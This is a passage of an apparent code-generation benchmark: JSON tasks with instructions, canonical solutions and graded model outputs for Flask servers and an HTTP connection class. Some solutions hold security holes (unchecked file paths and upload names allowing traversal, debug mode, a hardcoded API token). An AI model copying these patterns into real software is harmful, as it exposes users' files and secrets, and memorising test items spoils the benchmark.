JSON payload received'}), 400\n    \n    query = data.get('query')\n    variables = data.get('variables')\n    \n    if not query:\n        return jsonify({'error': 'No query provided'}), 400\n    \n    try:\n        result = graphql(schema, query, variable_values=variables)\n        if result.errors:\n            return jsonify({'errors': [str(error) for error in result.errors]}), 400\n        return jsonify({'data': result.data})\n    except Exception as e:\n        return jsonify({'error': str(e)}), 400\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 167,
    "Instruction": "The provided reference code is at the function level, specifically focusing on a Flask web application's route handling. Here's the structured instruction:\n\nTask Description: Create a Flask web application route handler that processes both GET and POST requests, implements various command-based functionalities, and returns appropriate HTML templates based on the input commands.\n\nFunction Description: The `index()` function serves as the main route handler for the root URL (\"/\"). It processes incoming HTTP requests, executes different actions based on the received commands (for POST requests), and returns corresponding HTML templates. The function handles feature activation, information display, and system operations through a command interface.\n\nInput:\n- HTTP request object (implicit through Flask)\n- For POST requests:\n  - Form data containing a command string (key: \"in\")\n- For GET requests:\n  - No explicit input parameters\n- Global variables (used in the function but not passed as parameters):\n  - redirectionMicrosoft (bool)\n  - redirectionMicrosoftFailed (bool)\n  - phone_number (str)\n  - email (str)\n  - password (str)\n  - Various feature flags (social_media, get_links, etc.)\n\nOutput:\n- HTTP responses containing:\n  - Rendered HTML templates (for successful operations)\n  - Redirects to other routes (for certain conditions)\n  - Error pages (for failed operations)\n\nThe function returns different responses based on:\n1. Request method (GET/POST)\n2. Specific command received (for POST requests)\n3. System state (global variables)\n4. Success/failure of operations",
    "Canonical_solution": "import os\nfrom flask import Flask, render_template, request, redirect, url_for\nimport threading\nimport subprocess\n\napp = Flask(__name__)\n\ndef run_flask_server():\n    app.run(str(subprocess.check_output(\"hostname -I | awk '{print $1}'\", shell=True).decode().strip()), 8080, debug=True)\n\n@app.route(\"/\", methods=[\"POST\", \"GET\"])\ndef index():\n    if request.method == \"GET\":\n        if redirectionMicrosoft == True:\n            return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n        if redirectionMicrosoftFailed == True:\n            return render_template(\"failed.html\")\n        return render_template(\"index.html\")\n    if request.method == \"POST\":\n        command = request.form[\"in\"]\n        if command == \"help\":\n            return render_template(\"help.html\")\n        elif command[0:15] == \"add PhoneNumber\":\n            phone_number = str(\"+\" + re.search(\"\\d+\", command).group(0))\n            return render_template(\"phoneNumberSuccess.html\", phone_number=phone_number)\n        elif command[0:21] == \"add feature FindOwner\":\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature SocialMedia\":\n            social_media = \"Added\"\n            try:\n                return render_template(\"socialMediaSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature GetLinks\":\n            get_links = \"Added\"\n            try:\n                return render_template(\"GetLinksSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature SpamRisk\":\n            spam_risk = \"Added\"\n            try:\n                return render_template(\"SpamRiskSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature GetComments\":\n            get_comments = \"Added\"\n            try:\n                return render_template(\"GetCommentsSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:12] == \"show options\":\n            try:\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n            except:\n                phone_number = \"Not Provided\"\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n        elif command[0:20] == \"add feature *\":\n            runall = \"Added\"\n            social_media = \"Added\"\n            spam_risk = \"Added\"\n            get_comments = \"Added\"\n            get_links = \"Added\"\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"featureAll.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:3] == \"run\":\n            Investigation.general.location(phone_number)\n            country = Investigation.general.returnCountry()\n            operator = Investigation.general.returnOperator()\n            timeZone = Investigation.general.returnTimeZone()\n            errNumber = Investigation.general.return_errNumber_()\n            currentTime = Investigation.general.returnCurrentTime()\n            if errNumber != \"False\":\n                threading.Thread(target=runScripts).start()\n                time.sleep(2)\n                return redirect(url_for(\"investigation\"))\n            else:\n                return redirect(url_for(\"investigationErr\"))\n        else:\n            return render_template(\"unkownCommand.html\")\n\nif __name__ == \"__main__\":\n    run_flask_server()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template, redirect, url_for\n\napp = Flask(__name__)\n\n# Global variables\nredirectionMicrosoft = False\nredirectionMicrosoftFailed = False\nphone_number = \"\"\nemail = \"\"\npassword = \"\"\nsocial_media = False\nget_links = False\n\ndef handle_command(command):\n    global redirectionMicrosoft, redirectionMicrosoftFailed, phone_number, email, password, social_media, get_links\n    \n    if command == \"activate_social_media\":\n        social_media = True\n        return \"Social media feature activated.\"\n    \n    elif command == \"deactivate_social_media\":\n        social_media = False\n        return \"Social media feature deactivated.\"\n    \n    elif command == \"toggle_links\":\n        get_links = not get_links\n        status = \"enabled\" if get_links else \"disabled\"\n        return f\"Link fetching {status}.\"\n    \n    elif command.startswith(\"set_phone:\"):\n        phone_number = command.split(\":\", 1)[1]\n        return \"Phone number updated.\"\n    \n    elif command.startswith(\"set_email:\"):\n        email = command.split(\":\", 1)[1]\n        return \"Email address updated.\"\n    \n    elif command.startswith(\"set_password:\"):\n        password = command.split(\":\", 1)[1]\n        return \"Password updated.\"\n    \n    elif command == \"redirect_microsoft\":\n        redirectionMicrosoft = True\n        return \"Redirecting to Microsoft...\"\n    \n    elif command == \"check_status\":\n        status = {\n            \"redirectionMicrosoft\": redirectionMicrosoft,\n            \"redirectionMicrosoftFailed\": redirectionMicrosoftFailed,\n            \"social_media\": social_media,\n            \"get_links\": get_links\n        }\n        return f\"System Status: {status}\"\n    \n    elif command == \"reset\":\n        redirectionMicrosoft = False\n        redirectionMicrosoftFailed = False\n        phone_number = \"\"\n        email = \"\"\n        password = \"\"\n        social_media = False\n        get_links = False\n        return \"System reset complete.\"\n    \n    else:\n        return \"Unknown command.\"\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef index():\n    if request.method == \"POST\":\n        command = request.form.get(\"in\")\n        \n        if not command:\n            return render_template(\"error.html\", message=\"No command provided.\"), 400\n        \n        try:\n            result = handle_command(command)\n            \n            if command == \"redirect_microsoft\":\n                return redirect(url_for(\"microsoft\"))\n                \n            return render_template(\"result.html\", result=result)\n        \n        except Exception as e:\n            return render_template(\"error.html\", message=f\"Command execution failed: {str(e)}\"), 500\n    \n    # GET request handling\n    if redirectionMicrosoft:\n        return redirect(url_for(\"microsoft\"))\n    \n    if redirectionMicrosoftFailed:\n        return render_template(\"error.html\", message=\"Microsoft redirection previously failed.\")\n    \n    return render_template(\"index.html\")  # Default template for initial display\n\n@app.route(\"/microsoft\")\ndef microsoft():\n    return \"Redirected to Microsoft.\""
  },
  {
    "Task_id": 168,
    "Instruction": "Task Description: Create a Flask-based HTTP server application that serves files from a specified directory, handles file uploads, and implements basic authentication. The server should support both directory browsing and file downloads, with optional SSL encryption.\n\nFunction Description: The function `create_flask_app` initializes and runs a Flask web server with the following capabilities:\n1. Serves files from a specified directory with directory browsing\n2. Handles file uploads to valid subdirectories\n3. Implements HTTP Basic Authentication\n4. Supports optional SSL encryption\n5. Handles permission errors gracefully\n\nInput:\n- directory: [str] - The root directory to serve files from\n- port: [int] - The port number to run the server on\n- password: [str] - The password for HTTP Basic Authentication\n- ssl: [bool] - Whether to enable SSL encryption\n\nOutput: None (The function runs the server indefinitely until interrupted)\n\nMethods:\n- home(path): Handles requests for files and directories\n  Input: path [str] - The requested file/directory path\n  Output: Flask response (file download, directory listing, or redirect)\n  \n- upload(): Handles file uploads via POST requests\n  Input: None (uses Flask's request object)\n  Output: Flask redirect response\n  \n- verify_password(username, password): Verifies HTTP Basic Authentication credentials\n  Input: \n    username [str] - The username (ignored in this implementation)\n    password [str] - The password to verify\n  Output: [bool] - True if authentication succeeds, False otherwise",
    "Canonical_solution": "from flask import Flask, render_template, send_file, redirect, request, send_from_directory, url_for, abort\nfrom flask_httpauth import HTTPBasicAuth\nfrom werkzeug.utils import secure_filename\nfrom werkzeug.security import generate_password_hash, check_password_hash\nfrom werkzeug.serving import run_simple\n\ndef create_flask_app(directory, port, password, ssl):\n    app = Flask(__name__)\n    auth = HTTPBasicAuth()\n\n    @app.route('/', defaults={'path': None})\n    @app.route('/<path:path>')\n    @auth.login_required\n    def home(path):\n        if path and is_valid_subpath(path, directory):\n            path = os.path.normpath(path)\n            requested_path = os.path.join(directory, path)\n\n            if os.path.isdir(requested_path):\n                back = get_parent_directory(requested_path, directory)\n                is_subdirectory = True\n            elif os.path.isfile(requested_path):\n                if request.args.get('view') is None:\n                    send_as_attachment = True\n                else:\n                    send_as_attachment = False\n\n                (filename, extension) = os.path.splitext(requested_path)\n                if extension == '':\n                    mimetype = 'text/plain'\n                else:\n                    mimetype = None\n\n                try:\n                    return send_file(requested_path, mimetype=mimetype, as_attachment=send_as_attachment)\n                except PermissionError:\n                    abort(403, 'Read Permission Denied: ' + requested_path)\n        else:\n            is_subdirectory = False\n            requested_path = directory\n            back = ''\n\n        if os.path.exists(requested_path):\n            try:\n                directory_files = process_files(os.scandir(requested_path), directory)\n            except PermissionError:\n                abort(403, 'Read Permission Denied: ' + requested_path)\n\n            return render_template('home.html', files=directory_files, back=back,\n                                 directory=requested_path, is_subdirectory=is_subdirectory, version=VERSION)\n        else:\n            return redirect('/')\n\n    @app.route('/upload', methods=['POST'])\n    @auth.login_required\n    def upload():\n        if request.method == 'POST':\n            if 'file' not in request.files:\n                return redirect(request.referrer)\n\n            path = request.form['path']\n            if not is_valid_upload_path(path, directory):\n                return redirect(request.referrer)\n\n            for file in request.files.getlist('file'):\n                if file.filename == '':\n                    return redirect(request.referrer)\n\n                if file:\n                    filename = secure_filename(file.filename)\n                    full_path = os.path.join(path, filename)\n                    try:\n                        file.save(full_path)\n                    except PermissionError:\n                        abort(403, 'Write Permission Denied: ' + full_path)\n\n            return redirect(request.referrer)\n\n    users = {\n        '': generate_password_hash(password)\n    }\n\n    @auth.verify_password\n    def verify_password(username, password):\n        if password:\n            if username in users:\n                return check_password_hash(users.get(username), password)\n            return False\n        else:\n            return True\n\n    ssl_context = 'adhoc' if ssl else None\n    run_simple(\"0.0.0.0\", int(port), app, ssl_context=ssl_context)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, send_from_directory, request, redirect, url_for, abort\nfrom functools import wraps\nimport os\nimport ssl\n\ndef create_flask_app(directory, port, password, ssl_flag):\n    app = Flask(__name__)\n    \n    def verify_password(username, provided_password):\n        return provided_password == password\n\n    def require_auth(f):\n        @wraps(f)\n        def decorated(*args, **kwargs):\n            auth = request.authorization\n            if not (auth and verify_password(auth.username, auth.password)):\n                return 'Unauthorized', 401, {'WWW-Authenticate': 'Basic realm=\"Login Required\"'}\n            return f(*args, **kwargs)\n        return decorated\n\n    @app.route('/<path:path>', methods=['GET', 'POST'])\n    @require_auth\n    def home(path):\n        full_path = os.path.join(directory, path)\n        \n        if not os.path.exists(full_path):\n            return \"Path not found\", 404\n            \n        if os.path.isfile(full_path):\n            return send_from_directory(directory, path)\n            \n        if request.method == 'POST':\n            return redirect(url_for('upload', path=path))\n            \n        files = []\n        for item in os.listdir(full_path):\n            item_path = os.path.join(path, item)\n            try:\n                is_dir = os.path.isdir(os.path.join(directory, item_path))\n                files.append({'name': item, 'is_dir': is_dir})\n            except PermissionError:\n                continue\n                \n        return f\"\"\"\n        <h1>Directory: {path}</h1>\n        <ul>\n            {\"\".join(f'<li><a href=\"{item[\"name\"]}/\">{item[\"name\"]}</a></li>' if item['is_dir'] \n                    else f'<li><a href=\"{os.path.join(path, item[\"name\"])}\">{item[\"name\"]}</a></li>' \n                    for item in files)}\n        </ul>\n        \"\"\"\n\n    @app.route('/upload/<path:path>', methods=['POST'])\n    @require_auth\n    def upload(path):\n        if 'file' not in request.files:\n            return \"No file part\", 400\n            \n        file = request.files['file']\n        if file.filename == '':\n            return \"No selected file\", 400\n            \n        upload_path = os.path.join(directory, path)\n        if not os.path.exists(upload_path) or not os.path.isdir(upload_path):\n            return \"Invalid upload directory\", 400\n            \n        try:\n            file.save(os.path.join(upload_path, file.filename))\n            return redirect(url_for('home', path=path))\n        except PermissionError:\n            return \"Permission denied\", 403\n\n    if ssl_flag:\n        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n        context.load_cert_chain('server.crt', 'server.key')\n        app.run(host='0.0.0.0', port=port, ssl_context=context)\n    else:\n        app.run(host='0.0.0.0', port=port)"
  },
  {
    "Task_id": 169,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles QR code generation, status checking, and token retrieval for an authentication system.\n\nFunction Description: The server provides three main endpoints: one to display a main page with QR code, one to generate QR code URLs, one to check QR code status, and one to retrieve authentication tokens.\n\nInput:\n- For '/get_qrcode' endpoint: GET request with no parameters\n- For '/check_qrcode/<sid>' endpoint: GET request with sid (session ID) as URL parameter\n- For '/get_tokens' endpoint: POST request with JSON body containing auth_code\n\nOutput:\n- '/get_qrcode': Returns JSON with QR code URL data\n- '/check_qrcode/<sid>': Returns JSON with QR code status\n- '/get_tokens': Returns JSON with status confirmation after processing auth_code",
    "Canonical_solution": "import time\nimport logging\nimport json\nimport uuid\nimport hashlib\nimport base64\nimport random\nimport sys\nimport requests\nfrom flask import Flask, jsonify, render_template, request\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\napp = Flask(__name__)\ntimestamp = str(requests.get('http://api.extscreen.com/timestamp', timeout=10).json()['data']['timestamp'])\nunique_id = uuid.uuid4().hex\nwifimac = str(random.randint(10**11, 10**12 - 1))\nheaders = {\n    \"token\": \"6733b42e28cdba32\",\n    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 9; zh-cn; SM-S908E Build/TP1A.220624.014) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1',\n    'Host': 'api.extscreen.com'\n}\n\n@app.route('/')\ndef main_page():\n    return render_template('qrcode.html')\n\n@app.route('/get_qrcode', methods=['GET'])\ndef get_qrcode():\n    return jsonify(get_qrcode_url())\n\n@app.route('/check_qrcode/<sid>', methods=['GET'])\ndef check_qrcode(sid):\n    return jsonify(check_qrcode_status(sid))\n\n@app.route('/get_tokens', methods=['POST'])\ndef get_tokens():\n    _auth_code = request.json.get('auth_code')\n    get_token(_auth_code)\n    return jsonify({'status': 'completed'})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, render_template\nimport uuid\nimport time\n\napp = Flask(__name__)\n\n# Simulated storage for session and token data\nsessions = {}\ntokens = {}\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/get_qrcode', methods=['GET'])\ndef get_qrcode():\n    sid = str(uuid.uuid4())\n    expires_at = time.time() + 300  # QR code expires in 5 minutes\n    sessions[sid] = {'status': 'pending', 'expires_at': expires_at}\n    qrcode_url = f\"https://fake-qr-server.com/qr/{sid}\"\n    return jsonify({\n        'sid': sid,\n        'qrcode_url': qrcode_url,\n        'expires_in': 300\n    })\n\n@app.route('/check_qrcode/<sid>', methods=['GET'])\ndef check_qrcode(sid):\n    session = sessions.get(sid)\n    if not session:\n        return jsonify({'status': 'invalid'}), 404\n    if time.time() > session['expires_at']:\n        return jsonify({'status': 'expired'})\n    return jsonify({'status': session['status']})\n\n@app.route('/get_tokens', methods=['POST'])\ndef get_tokens():\n    data = request.get_json()\n    auth_code = data.get('auth_code')\n    if not auth_code:\n        return jsonify({'status': 'error', 'message': 'Missing auth_code'}), 400\n    # Simulate successful token retrieval\n    tokens[auth_code] = {\n        'access_token': 'fake-access-token',\n        'refresh_token': 'fake-refresh-token',\n        'expires_in': 3600\n    }\n    return jsonify({'status': 'success'})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a custom HTTPConnection class that extends Python's http.client.HTTPConnection to provide enhanced functionality including proxy support, socket options, and improved error handling.\n\nClass Description: HTTPConnection is a subclass of http.client.HTTPConnection that adds additional features for making HTTP requests, including proxy support, configurable socket options, and better error handling. It maintains connection state and provides methods for making requests and processing responses.\n\nAttributes:\n- default_port: typing.ClassVar[int] - Default port for HTTP connections (80)\n- default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] - Default TCP socket options (TCP_NODELAY enabled)\n- socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] - Custom socket options for the connection\n- proxy: Optional[Url] - Proxy URL for the connection\n- proxy_config: Optional[ProxyConfig] - Configuration for proxy connections\n- _has_connected_to_proxy: bool - Flag indicating if connected to proxy\n- _response_options: Optional[_ResponseOptions] - Stores response processing options\n- _tunnel_host: Optional[str] - Host for tunnel connection\n- _tunnel_port: Optional[int] - Port for tunnel connection\n- _tunnel_scheme: Optional[str] - Scheme for tunnel connection\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, *, timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT, source_address: Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options, proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None - Initializes the HTTP connection with specified parameters\n- _new_conn() -> socket.socket - Creates a new socket connection with error handling\n- connect() -> None - Establishes the connection to the server or proxy\n- request(method: str, url: str, body: Optional[_TYPE_BODY] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None - Sends an HTTP request with the specified method, URL, body, and headers\n- getresponse() -> HTTPResponse - Gets the response from the server and returns an HTTPResponse object\n- close() -> None - Closes the connection and cleans up resources",
    "Canonical_solution": "import socket\nimport typing\nfrom http.client import HTTPConnection as _HTTPConnection\nfrom typing import Optional, Mapping, Union, Literal\nfrom .util.timeout import _TYPE_TIMEOUT, Timeout\nfrom ._base_connection import _TYPE_BODY\nfrom .util import connection\nfrom .util.url import Url\n\nclass HTTPConnection(_HTTPConnection):\n    default_port: typing.ClassVar[int] = port_by_scheme[\"http\"]\n    default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] = [\n        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n    ]\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        *,\n        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,\n        source_address: Optional[tuple[str, int]] = None,\n        blocksize: int = 16384,\n        socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options,\n        proxy: Optional[Url] = None,\n        proxy_config: Optional[ProxyConfig] = None,\n    ) -> None:\n        super().__init__(\n            host=host,\n            port=port,\n            timeout=Timeout.resolve_default_timeout(timeout),\n            source_address=source_address,\n            blocksize=blocksize,\n        )\n        self.socket_options = socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = None\n        self._tunnel_host: Optional[str] = None\n        self._tunnel_port: Optional[int] = None\n        self._tunnel_scheme: Optional[str] = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = connection.create_connection(\n                (self._dns_host, self.port),\n                self.timeout,\n                source_address=self.source_address,\n                socket_options=self.socket_options,\n            )\n        except socket.gaierror as e:\n            raise NameResolutionError(self.host, self, e) from e\n        except SocketTimeout as e:\n            raise ConnectTimeoutError(\n                self,\n                f\"Connection to {self.host} timed out. (connect timeout={self.timeout})\",\n            ) from e\n        except OSError as e:\n            raise NewConnectionError(\n                self, f\"Failed to establish a new connection: {e}\"\n            ) from e\n        return sock\n\n    def connect(self) -> None:\n        self.sock = self._new_conn()\n        if self._tunnel_host:\n            self._has_connected_to_proxy = True\n            self._tunnel()\n        self._has_connected_to_proxy = bool(self.proxy)\n\n    def request(\n        self,\n        method: str,\n        url: str,\n        body: Optional[_TYPE_BODY] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        *,\n        chunked: bool = False,\n        preload_content: bool = True,\n        decode_content: bool = True,\n        enforce_content_length: bool = True,\n    ) -> None:\n        if self.sock is not None:\n            self.sock.settimeout(self.timeout)\n\n        self._response_options = _ResponseOptions(\n            request_method=method,\n            request_url=url,\n            preload_content=preload_content,\n            decode_content=decode_content,\n            enforce_content_length=enforce_content_length,\n        )\n\n        if headers is None:\n            headers = {}\n        header_keys = frozenset(to_str(k.lower()) for k in headers)\n        skip_accept_encoding = \"accept-encoding\" in header_keys\n        skip_host = \"host\" in header_keys\n        self.putrequest(\n            method, url, skip_accept_encoding=skip_accept_encoding, skip_host=skip_host\n        )\n\n        chunks_and_cl = body_to_chunks(body, method=method, blocksize=self.blocksize)\n        chunks = chunks_and_cl.chunks\n        content_length = chunks_and_cl.content_length\n\n        if chunked:\n            if \"transfer-encoding\" not in header_keys:\n                self.putheader(\"Transfer-Encoding\", \"chunked\")\n        else:\n            if \"content-length\" in header_keys:\n                chunked = False\n            elif \"transfer-encoding\" in header_keys:\n                chunked = True\n            else:\n                chunked = False\n                if content_length is None:\n                    if chunks is not None:\n                        chunked = True\n                        self.putheader(\"Transfer-Encoding\", \"chunked\")\n                else:\n                    self.putheader(\"Content-Length\", str(content_length))\n\n        if \"user-agent\" not in header_keys:\n            self.putheader(\"User-Agent\", _get_default_user_agent())\n        for header, value in headers.items():\n            self.putheader(header, value)\n        self.endheaders()\n\n        if chunks is not None:\n            for chunk in chunks:\n                if not chunk:\n                    continue\n                if isinstance(chunk, str):\n                    chunk = chunk.encode(\"utf-8\")\n                if chunked:\n                    self.send(b\"%x\\r\\n%b\\r\\n\" % (len(chunk), chunk))\n                else:\n                    self.send(chunk)\n\n        if chunked:\n            self.send(b\"0\\r\\n\\r\\n\")\n\n    def getresponse(self) -> HTTPResponse:\n        if self._response_options is None:\n            raise ResponseNotReady()\n\n        resp_options = self._response_options\n        self._response_options = None\n        self.sock.settimeout(self.timeout)\n\n        httplib_response = super().getresponse()\n        headers = HTTPHeaderDict(httplib_response.msg.items())\n\n        response = HTTPResponse(\n            body=httplib_response,\n            headers=headers,\n            status=httplib_response.status,\n            version=httplib_response.version,\n            version_string=getattr(self, \"_http_vsn_str\", \"HTTP/?\"),\n            reason=httplib_response.reason,\n            preload_content=resp_options.preload_content,\n            decode_content=resp_options.decode_content,\n            original_response=httplib_response,\n            enforce_content_length=resp_options.enforce_content_length,\n            request_method=resp_options.request_method,\n            request_url=resp_options.request_url,\n        )\n        return response\n\n    def close(self) -> None:\n        try:\n            super().close()\n        finally:\n            self.sock = None\n            self.is_verified = False\n            self.proxy_is_verified = None\n            self._has_connected_to_proxy = False\n            self._response_options = None\n            self._tunnel_host = None\n            self._tunnel_port = None\n            self._tunnel_scheme = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nfrom typing import Optional, Mapping, Any, List, Tuple, cast\nfrom http.client import HTTPConnection as _HTTPConnection, HTTPResponse, _TYPE_TIMEOUT, _DEFAULT_TIMEOUT, _TYPE_BODY\nfrom urllib.parse import urlparse\n\nclass Url:\n    def __init__(self, url: str):\n        parsed = urlparse(url)\n        self.scheme = parsed.scheme\n        self.netloc = parsed.netloc\n        self.hostname = parsed.hostname\n        self.port = parsed.port\n\nclass ProxyConfig:\n    def __init__(self, auth: Optional[Tuple[str, str]] = None):\n        self.auth = auth\n\n_TYPE_SOCKET_OPTIONS = List[Tuple[int, int, int]]\n\nclass HTTPConnection(_HTTPConnection):\n    default_port: int = 80\n    default_socket_options: _TYPE_SOCKET_OPTIONS = [(socket.SOL_TCP, socket.TCP_NODELAY, 1)]\n\n    def __init__(self, host: str, port: Optional[int] = None, *, timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,\n                 source_address: Optional[Tuple[str, int]] = None, blocksize: int = 16384,\n                 socket_options: Optional[_TYPE_SOCKET_OPTIONS] = None,\n                 proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None:\n        super().__init__(host, port, timeout=timeout, source_address=source_address, blocksize=blocksize)\n        self.socket_options = socket_options or self.default_socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = None\n        self._tunnel_host = None\n        self._tunnel_port = None\n        self._tunnel_scheme = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = socket.create_connection(\n                (self.host, self.port),\n                timeout=self.timeout,\n                source_address=self.source_address\n            )\n            for level, optname, value in self.socket_options:\n                sock.setsockopt(level, optname, value)\n            return sock\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to create new connection: {e}\") from e\n\n    def connect(self) -> None:\n        if self.proxy:\n            self._connect_to_proxy()\n        else:\n            super().connect()\n\n    def _connect_to_proxy(self) -> None:\n        if not self.proxy:\n            return\n\n        self.sock = self._new_conn()\n        self._has_connected_to_proxy = True\n\n        if self.proxy.scheme.lower() == \"https\":\n            self._tunnel_host = self.host\n            self._tunnel_port = self.port\n            self._tunnel_scheme = \"https\"\n            self._sock = self.sock\n            self.sock = None\n            self.host = self.proxy.hostname\n            self.port = self.proxy.port or 80\n            super().connect()\n            self._tunnel()\n\n    def _tunnel(self) -> None:\n        connect_str = f\"{self._tunnel_host}:{self._tunnel_port}\"\n        self.putrequest(\"CONNECT\", connect_str)\n\n        if self.proxy_config and self.proxy_config.auth:\n            import base64\n            user_pass = f\"{self.proxy_config.auth[0]}:{self.proxy_config.auth[1]}\"\n            encoded = base64.b64encode(user_pass.encode()).decode()\n            self.putheader(\"Proxy-Authorization\", f\"Basic {encoded}\")\n\n        self.endheaders()\n        response = self.getresponse()\n        if response.status != 200:\n            self.close()\n            raise ConnectionError(f\"Proxy tunnel failed with status: {response.status}\")\n\n    def request(self, method: str, url: str, body: Optional[_TYPE_BODY] = None,\n                headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False,\n                preload_content: bool = True, decode_content: bool = True,\n                enforce_content_length: bool = True) -> None:\n        super().request(method, url, body, headers, chunked=chunked)\n        self._response_options = {\n            'preload_content': preload_content,\n            'decode_content': decode_content,\n            'enforce_content_length': enforce_content_length\n        }\n\n    def getresponse(self) -> HTTPResponse:\n        response = super().getresponse()\n        return response\n\n    def close(self) -> None:\n        super().close()\n        self.sock = None\n        self._response_options = None\n\n    class _ResponseOptions(TypedDict):\n        preload_content: bool\n        decode_content: bool\n        enforce_content_length: bool\n        buffer_size: Optional[int]"
  },
  {
    "Task_id": 171,
    "Instruction": "Task Description: Create a Flask-based HTTP server for Text-to-Speech (TTS) processing that handles multiple API endpoints for TTS generation, batch processing, and progress tracking.\n\nClass Description: FlaskTTSAPI is a Flask application wrapper that provides TTS functionality through HTTP endpoints. It manages TTS requests, batch processing of text files, and progress tracking for long-running tasks.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- chuliing: [dict] - Tracks progress of batch processing tasks with keys 'name' (current file), 'line' (current line), and 'end' (completion status)\n\nMethods:\n- __init__() -> [None] - Initializes the Flask app, sets up routes and logging\n- _setup_logging() -> [None] - Configures logging with file rotation\n- _setup_routes() -> [None] - Defines all API endpoints and their handler methods\n- apitts() -> [flask.Response] - Handles single TTS requests. Returns JSON with either the generated audio file or an error message\n- ttslistjindu() -> [flask.Response] - Returns current progress of batch processing as JSON\n- ttslist() -> [flask.Response] - Initiates batch processing of text files. Returns immediate acknowledgment\n- detail_task(voice: str, src: str, dst: str, speed: float, language: str) -> [None] - Background task for processing text files into TTS audio\n- run() -> [None] - Starts the WSGI server to handle HTTP requests\n\nInput:\n- For apitts(): HTTP POST with form data containing 'text', 'language', and either 'voice' or 'audio' file\n- For ttslist(): HTTP POST with form data containing 'voice', 'src' (source dir), 'dst' (destination dir), 'speed', and 'language'\n- For ttslistjindu(): HTTP GET request to check progress\n\nOutput:\n- JSON responses containing either:\n  - Success: {'code': 0, 'url': [generated_audio_url]} or {'code': 0, 'msg': 'ok'}\n  - Error: {'code': 1 or 2, 'msg': [error_description]}\n  - Progress: {'name': [current_file], 'line': [current_line], 'end': [True/False]}",
